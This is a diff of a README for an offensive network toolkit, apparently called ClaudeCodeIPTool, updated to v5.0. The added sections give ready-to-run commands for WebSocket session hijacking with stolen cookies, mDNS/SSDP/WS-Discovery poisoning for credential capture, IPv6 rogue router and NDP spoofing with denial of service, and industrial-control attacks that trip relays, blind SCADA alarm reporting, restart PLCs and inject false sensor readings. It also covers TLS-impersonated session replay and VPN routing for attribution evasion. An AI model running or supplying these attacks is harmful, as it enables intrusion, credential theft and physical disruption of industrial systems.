@@ -1,8 +1,8 @@
-# ClaudeCodeIPTool v4.0
+# ClaudeCodeIPTool v5.0
 
-Complete IP spoofing, session replay, and proxy routing suite for VDT (Vulnerability Discovery Testing). **11 functional tools** covering reconnaissance, Layer 2/3/DHCP MITM, Chrome TLS impersonation, SOCKS5 routing, credential capture, and defense detection.
+Complete IP spoofing, MITM, session replay, and proxy routing suite for VDT (Vulnerability Discovery Testing). **15 functional tools** covering reconnaissance, Layer 2/3/DHCP/IPv6/ICS MITM, WebSocket hijacking, service discovery poisoning, Chrome TLS impersonation, SOCKS5 routing, credential capture, and defense detection.
 
-**New in v4.0:** DHCP spoofing (RFC 2131 4-way handshake), gratuitous ARP, bidirectional ARP poisoning.
+**New in v5.0:** IPv6 NDP/RA spoofing, mDNS/WS-Discovery/SSDP poisoning, ICS/OT protocol probe (Modbus/DNP3/EtherNet-IP/BACnet/OPC-UA), WebSocket CSWSH + frame injection.
 
 ---
 
@@ -147,9 +147,134 @@ sudo python3 mitm-suite.py -v
 
 ---
 
+#### 9. `ws-hijack.py` - WebSocket Session Hijacking
+WebSocket attack primitives: CSWSH, frame injection, Origin spoofing, covert channel:
+- **CSWSH**: Cross-Site WebSocket Hijacking (no CORS on WS, browser auto-sends cookies on upgrade GET)
+- **Frame injection**: Raw socket WS connect + masked frame construction (opcode/RSV/FIN control)
+- **Covert channel**: RSV1 bit set = data invisible to DLP/IDS string matching
+- **Forge 101**: Generate valid Sec-WebSocket-Accept token for MITM handshake positioning
+
+```bash
+# CSWSH probe: does server validate Origin?
+python3 ws-hijack.py cswsh ws://target.com/ws --origin http://evil.com --cookies session=abc
+
+# Inject frame into existing WS connection
+python3 ws-hijack.py inject ws://target.com/ws --payload '{"action":"admin"}'
+
+# Generate Sec-WebSocket-Accept for MITM
+python3 ws-hijack.py forge --key dGhlIHNhbXBsZSBub25jZQ==
+```
+
+**Status**: ✓ Functional (no additional dependencies)
+
+**Key mechanism**: `SHA1(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11") → base64` is the entire WebSocket handshake auth. Client-to-server frames are masked; server-to-client unmasked.
+
+---
+
+#### 10. `mdns-poison.py` - Multicast Service Discovery Poisoning
+Poison three IoT/LAN service discovery protocols simultaneously:
+- **mDNS** (224.0.0.251:5353): Apple AirPrint, Chromecast, IoT device discovery → forge PTR/SRV/A
+- **WS-Discovery** (239.255.255.250:3702): ONVIF IP cameras, network printers → fake ProbeMatch SOAP
+- **SSDP/UPnP** (239.255.255.250:1900): Smart TVs, routers, IoT → fake Internet Gateway Device
+
+```bash
+# Poison all mDNS service queries → attacker
+sudo python3 mdns-poison.py mdns --attacker-ip 192.168.1.50 -v
+
+# Pose as Hikvision IP camera for credential capture
+sudo python3 mdns-poison.py wsd --attacker-ip 192.168.1.50 --device-name Hikvision-DS-2CD
+
+# Broadcast fake UPnP IGD (router) for AddPortMapping abuse
+sudo python3 mdns-poison.py ssdp --attacker-ip 192.168.1.50 --port 8080
+
+# All three simultaneously
+sudo python3 mdns-poison.py all --attacker-ip 192.168.1.50 -v
+```
+
+**Status**: ✓ Functional (optional: `pip install dnslib` for full mDNS record types)
+
+---
+
+#### 11. `ndp-spoof.py` - IPv6 NDP Poisoning + Rogue Router Advertisement
+IPv6 Neighbor Discovery Protocol attacks (IPv6 equivalent of ARP/DHCP spoofing):
+- **Rogue RA**: Become default IPv6 router via ICMPv6 type 134 → SLAAC clients auto-configure
+- **M=1 RA**: Force DHCPv6 stateful addressing → steer clients to rogue DHCPv6 server
+- **NA cache poison**: ICMPv6 type 136 O=1 → override neighbor cache (IPv6 ARP spoofing)
+- **Bidirectional NDP**: Poison both victim→gateway and gateway→victim simultaneously
+- **DAD DoS**: Intercept all Duplicate Address Detection NS, deny any address assignment
+
+```bash
+# Become IPv6 default router (SLAAC poisoning)
+sudo python3 ndp-spoof.py rogue-ra eth0 --prefix 2001:db8:evil:: --len 64 -v
+
+# Force DHCPv6 mode (M=1 O=1)
+sudo python3 ndp-spoof.py rogue-ra eth0 --mode dhcpv6 --lifetime 1800
+
+# Remove all default IPv6 routes (DoS)
+sudo python3 ndp-spoof.py rogue-ra eth0 --mode dos
+
+# Neighbor cache poisoning (IPv6 ARP spoof)
+sudo python3 ndp-spoof.py ndp-poison eth0 2001:db8::victim --gateway fe80::1
+
+# Deny all new IPv6 address assignments
+sudo python3 ndp-spoof.py dad-dos eth0
+
+# Full MITM: RA + bidirectional NDP
+sudo python3 ndp-spoof.py mitm eth0 --prefix fd00:evil:: --victim 2001:db8::100 --gateway fe80::1
+```
+
+**Status**: ✓ Functional (requires root/sudo + Scapy)
+
+**CRITICAL detail**: `hlim=255` required on all NDP packets (types 133-137) — most stacks silently drop anything else.
+
+---
+
+#### 12. `ics-probe.py` - ICS/OT Protocol Scanner and Packet Injector
+Industrial Control System protocol probe covering all 5 major ICS protocols:
+- **Modbus/TCP** (502): FC 01-16 read/write, FC 08 sub-4 listen-only DoS, FC 43 device ID enum
+- **DNP3** (20000): FC 0x18 disable unsolicited (operator blind), FC 0x05 direct operate (relay trip), FC 0x12 cold restart
+- **EtherNet/IP CIP** (44818/tcp + 2222/udp): CIP Reset (cold restart), Stop PLC (major fault), identity enum, UDP flood
+- **BACnet/IP** (47808/udp): Who-Is broadcast discovery, fake COV sensor injection
+- **OPC-UA** (4840): Hello probe, anonymous browse (SecurityMode=None detection)
+
+```bash
+# Multi-protocol scan (all 5 protocols)
+python3 ics-probe.py scan 192.168.1.100 -v
+
+# Modbus: read registers and coils
+python3 ics-probe.py modbus 192.168.1.100 enum
+
+# Modbus: flip relay coil 0 ON
+python3 ics-probe.py modbus 192.168.1.100 write-coil --unit 1 --addr 0 --value on
+
+# DNP3: blind SCADA operator (disable alarm reporting)
+python3 ics-probe.py dnp3 192.168.1.100 disable-unsolicited
+
+# DNP3: direct relay trip
+python3 ics-probe.py dnp3 192.168.1.100 operate --point 0 --value on
+
+# EtherNet/IP: enumerate Rockwell PLC identity
+python3 ics-probe.py enip 192.168.1.100 enum
+
+# EtherNet/IP: CIP Reset (cold restart - no auth)
+python3 ics-probe.py enip 192.168.1.100 reset
+
+# BACnet: Who-Is discovery broadcast
+python3 ics-probe.py bacnet 255.255.255.255 scan
+
+# BACnet: inject false temperature reading (150°F)
+python3 ics-probe.py bacnet 192.168.1.100 spoof-cov --device 1234 --type 0 --instance 0 --value 150.0
+```
+
+**Status**: ✓ Functional (optional: `pip install opcua` for OPC-UA browse)
+
+**Key finding from Project Basecamp (Digital Bond 2012)**: All ICS protocols above have no application-layer auth. CIP Reset requires only a registered session - no credentials.
+
+---
+
 ### Defensive
 
-#### 9. `defense-detector.py` - Spoofing Attack Detection
+#### 13. `defense-detector.py` - Spoofing Attack Detection
 Detect ARP/DNS attacks on your own network:
 - ARP spoof detection (MAC change monitoring per IP)
 - DNS spoof detection (response IP inconsistency tracking)
@@ -166,7 +291,7 @@ sudo python3 defense-detector.py dns -v
 
 ### Session Routing
 
-#### 10. `session_replay.py` - Cookie Session Replay with Chrome TLS Impersonation
+#### 14. `session_replay.py` - Cookie Session Replay with Chrome TLS Impersonation
 Replay captured browser sessions with proper TLS fingerprinting:
 - `curl_cffi` mimics Chrome's exact JA3/JA3s/ALPN fingerprint
 - Reads Netscape-format cookie files
@@ -182,7 +307,7 @@ python3 session_replay.py test-tls --url https://tls.browserleaks.com/tls
 
 **Status**: ✓ Functional (requires `pip install curl_cffi`)
 
-#### 11. `windscribe_socks.py` - SOCKS5 Proxy + Chrome TLS Chain
+#### 15. `windscribe_socks.py` - SOCKS5 Proxy + Chrome TLS Chain
 Channel sessions through VPN exit IPs:
 - Routes `curl_cffi` sessions through Windscribe SOCKS5 (localhost:1080)
 - Shows exit IP and ASN before/after for routing confirmation
@@ -257,15 +382,19 @@ sudo python3 dns-spoof.py --domain "*" --ip 192.168.1.50
 
 ## Capability Matrix
 
-| Tool | Spoofing Type | Scope | Persistence | Requires LAN |
-|------|--------------|-------|-------------|--------------|
-| spoofer.py | L3 one-way | Internet | Single shot | No |
-| spoof-scanner.py | L3 one-way | Internet | Single shot | No |
-| ghostport.py | L3 one-way | Internet | Single shot | No |
-| dhcp-spoof.py | Network config | Subnet | Lease duration | Yes |
-| arp-spoof.py | L2 bidirectional | LAN | Until stopped | Yes |
-| dns-spoof.py | DNS injection | LAN | Until stopped | Yes |
-| mitm-suite.py | Passive capture | LAN | Until stopped | Yes |
+| Tool | Attack Type | Scope | Protocol Layer | Requires LAN |
+|------|------------|-------|----------------|--------------|
+| spoofer.py | L3 one-way | Internet | IPv4 | No |
+| spoof-scanner.py | Reflection scan | Internet | IPv4/UDP | No |
+| ghostport.py | Attribution evasion | Internet | TCP | No |
+| dhcp-spoof.py | Network config hijack | Subnet | IPv4 DHCP | Yes |
+| arp-spoof.py | L2 bidirectional MITM | LAN | L2/ARP | Yes |
+| dns-spoof.py | DNS injection | LAN | DNS/UDP | Yes |
+| mitm-suite.py | Credential capture | LAN | L7 HTTP | Yes |
+| ws-hijack.py | Session hijack | Any | WebSocket | No |
+| mdns-poison.py | Service discovery | LAN | mDNS/WSD/SSDP | Yes |
+| ndp-spoof.py | L2+L3 IPv6 MITM | LAN | IPv6/NDP | Yes |
+| ics-probe.py | ICS/OT control | LAN/OT | Modbus/DNP3/CIP | Yes |
 
 ---
 
